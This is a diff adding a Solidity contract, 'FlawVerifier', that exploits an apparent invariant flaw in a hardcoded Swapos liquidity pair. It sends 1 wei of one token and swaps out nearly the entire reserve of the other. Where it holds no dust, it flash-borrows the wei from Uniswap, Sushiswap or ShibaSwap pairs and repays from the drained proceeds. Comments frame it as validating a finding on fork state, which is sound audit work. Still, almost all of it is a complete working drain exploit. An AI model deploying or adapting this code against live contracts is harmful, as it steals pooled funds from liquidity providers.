@@ -1,0 +1,275 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address owner) external view returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool);
+}
+
+interface ISwaposPairMinimal {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract FlawVerifier {
+    address public constant TARGET_PAIR = 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f;
+
+    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+    address private constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;
+
+    enum Path {
+        None,
+        DirectToken0DustDrainToken1,
+        DirectToken1DustDrainToken0,
+        FlashToken0DustDrainToken1,
+        FlashToken1DustDrainToken0
+    }
+
+    struct CallbackData {
+        address lenderPair;
+        bool borrowToken0Dust;
+    }
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+    bool private _executed;
+    bool private _hypothesisValidated;
+    Path private _path;
+    uint8 private _failureCode;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        require(!_executed, "already executed");
+        _executed = true;
+
+        ISwaposPairMinimal pair = ISwaposPairMinimal(TARGET_PAIR);
+        address token0 = pair.token0();
+        address token1 = pair.token1();
+        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
+
+        bool path0Feasible = _pathToken0DustCanDrainToken1(uint256(reserve0), uint256(reserve1));
+        bool path1Feasible = _pathToken1DustCanDrainToken0(uint256(reserve0), uint256(reserve1));
+        _hypothesisValidated = path0Feasible || path1Feasible;
+
+        // The reported paths are only valid if the pair's actual fork-state reserves satisfy
+        // the weakened invariant for the exact dust trade described in the finding.
+        if (!path0Feasible && !path1Feasible) {
+            // 1 = exact "1 wei in, reserve-1 out" path is mechanically impossible at this fork state.
+            _failureCode = 1;
+            return;
+        }
+
+        // Strategy label: direct_or_existing_balance_first.
+        if (path0Feasible && _balanceOf(token0, address(this)) >= 1) {
+            _executeDirectToken0DustDrainToken1(token0, token1, uint256(reserve1));
+            return;
+        }
+
+        if (path1Feasible && _balanceOf(token1, address(this)) >= 1) {
+            _executeDirectToken1DustDrainToken0(token0, token1, uint256(reserve0));
+            return;
+        }
+
+        // Minimal realistic funding step: borrow exactly the required dust from an existing
+        // same-token external AMM pair, then repay it from the drained proceeds.
+        address lender = _findExternalSameTokenPair(token0, token1);
+
+        if (lender == address(0)) {
+            // 2 = exact path would be valid, but no searched public same-token dust source exists.
+            _failureCode = 2;
+            return;
+        }
+
+        if (path0Feasible) {
+            _path = Path.FlashToken0DustDrainToken1;
+            _startFlash(lender, true, token0);
+            return;
+        }
+
+        _path = Path.FlashToken1DustDrainToken0;
+        _startFlash(lender, false, token1);
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        CallbackData memory decoded = abi.decode(data, (CallbackData));
+        require(msg.sender == decoded.lenderPair, "bad lender");
+        require(sender == address(this), "bad sender");
+
+        ISwaposPairMinimal target = ISwaposPairMinimal(TARGET_PAIR);
+        address targetToken0 = target.token0();
+        address targetToken1 = target.token1();
+        (uint112 targetReserve0, uint112 targetReserve1,) = target.getReserves();
+
+        IUniswapV2PairLike lender = IUniswapV2PairLike(decoded.lenderPair);
+        address lenderToken0 = lender.token0();
+        (uint112 lenderReserve0, uint112 lenderReserve1,) = lender.getReserves();
+
+        if (decoded.borrowToken0Dust) {
+            require((lenderToken0 == targetToken0 && amount0 == 1) || (lenderToken0 != targetToken0 && amount1 == 1), "unexpected dust");
+            require(_pathToken0DustCanDrainToken1(uint256(targetReserve0), uint256(targetReserve1)), "dust path invalid");
+
+            _safeTransfer(targetToken0, TARGET_PAIR, 1);
+            target.swap(0, uint256(targetReserve1) - 1, address(this), bytes(""));
+
+            uint256 repayAmount;
+            if (lenderToken0 == targetToken0) {
+                repayAmount = _getAmountIn(1, uint256(lenderReserve1), uint256(lenderReserve0));
+            } else {
+                repayAmount = _getAmountIn(1, uint256(lenderReserve0), uint256(lenderReserve1));
+            }
+
+            _safeTransfer(targetToken1, decoded.lenderPair, repayAmount);
+            _profitToken = targetToken1;
+            _profitAmount = _balanceOf(targetToken1, address(this));
+            _hypothesisValidated = true;
+            return;
+        }
+
+        require((lenderToken0 == targetToken1 && amount0 == 1) || (lenderToken0 != targetToken1 && amount1 == 1), "unexpected dust");
+        require(_pathToken1DustCanDrainToken0(uint256(targetReserve0), uint256(targetReserve1)), "dust path invalid");
+
+        _safeTransfer(targetToken1, TARGET_PAIR, 1);
+        target.swap(uint256(targetReserve0) - 1, 0, address(this), bytes(""));
+
+        uint256 repayAmount0;
+        if (lenderToken0 == targetToken1) {
+            repayAmount0 = _getAmountIn(1, uint256(lenderReserve1), uint256(lenderReserve0));
+        } else {
+            repayAmount0 = _getAmountIn(1, uint256(lenderReserve0), uint256(lenderReserve1));
+        }
+
+        _safeTransfer(targetToken0, decoded.lenderPair, repayAmount0);
+        _profitToken = targetToken0;
+        _profitAmount = _balanceOf(targetToken0, address(this));
+        _hypothesisValidated = true;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function hypothesisValidated() external view returns (bool) {
+        return _hypothesisValidated;
+    }
+
+    function exploitPath() external view returns (uint8) {
+        return uint8(_path);
+    }
+
+    function failureCode() external view returns (uint8) {
+        return _failureCode;
+    }
+
+    function _executeDirectToken0DustDrainToken1(address token0, address token1, uint256 reserve1) internal {
+        _path = Path.DirectToken0DustDrainToken1;
+        _safeTransfer(token0, TARGET_PAIR, 1);
+        ISwaposPairMinimal(TARGET_PAIR).swap(0, reserve1 - 1, address(this), bytes(""));
+        _profitToken = token1;
+        _profitAmount = _balanceOf(token1, address(this));
+        _hypothesisValidated = true;
+    }
+
+    function _executeDirectToken1DustDrainToken0(address token0, address token1, uint256 reserve0) internal {
+        _path = Path.DirectToken1DustDrainToken0;
+        _safeTransfer(token1, TARGET_PAIR, 1);
+        ISwaposPairMinimal(TARGET_PAIR).swap(reserve0 - 1, 0, address(this), bytes(""));
+        _profitToken = token0;
+        _profitAmount = _balanceOf(token0, address(this));
+        _hypothesisValidated = true;
+    }
+
+    function _startFlash(address lender, bool borrowToken0Dust, address borrowedToken) internal {
+        address lenderToken0 = IUniswapV2PairLike(lender).token0();
+        CallbackData memory data = CallbackData({lenderPair: lender, borrowToken0Dust: borrowToken0Dust});
+
+        if (lenderToken0 == borrowedToken) {
+            IUniswapV2PairLike(lender).swap(1, 0, address(this), abi.encode(data));
+        } else {
+            IUniswapV2PairLike(lender).swap(0, 1, address(this), abi.encode(data));
+        }
+    }
+
+    function _findExternalSameTokenPair(address token0, address token1) internal view returns (address pair) {
+        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(token0, token1);
+        if (_usableLenderPair(pair)) {
+            return pair;
+        }
+
+        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(token0, token1);
+        if (_usableLenderPair(pair)) {
+            return pair;
+        }
+
+        pair = IUniswapV2FactoryLike(SHIBASWAP_FACTORY).getPair(token0, token1);
+        if (_usableLenderPair(pair)) {
+            return pair;
+        }
+    }
+
+    function _pathToken0DustCanDrainToken1(uint256 reserve0, uint256 reserve1) internal pure returns (bool) {
+        if (reserve0 == 0 || reserve1 <= 1) {
+            return false;
+        }
+
+        uint256 balance0Adjusted = (reserve0 + 1) * 10000 - 10;
+        uint256 balance1Adjusted = 10000;
+        return balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * 1000 * 1000;
+    }
+
+    function _pathToken1DustCanDrainToken0(uint256 reserve0, uint256 reserve1) internal pure returns (bool) {
+        if (reserve1 == 0 || reserve0 <= 1) {
+            return false;
+        }
+
+        uint256 balance0Adjusted = 10000;
+        uint256 balance1Adjusted = (reserve1 + 1) * 10000 - 10;
+        return balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * 1000 * 1000;
+    }
+
+    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        require(amountOut > 0, "bad out");
+        require(reserveIn > 0 && reserveOut > amountOut, "bad reserves");
+        uint256 numerator = reserveIn * amountOut * 1000;
+        uint256 denominator = (reserveOut - amountOut) * 997;
+        return numerator / denominator + 1;
+    }
+
+    function _balanceOf(address token, address owner) internal view returns (uint256 amount) {
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, owner));
+        require(ok && data.length >= 32, "balanceOf failed");
+        amount = abi.decode(data, (uint256));
+    }
+
+    function _usableLenderPair(address pair) internal view returns (bool) {
+        if (pair == address(0) || pair == TARGET_PAIR) {
+            return false;
+        }
+
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+        return reserve0 > 1 && reserve1 > 1;
+    }
+
+    function _safeTransfer(address token, address to, uint256 value) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, value));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
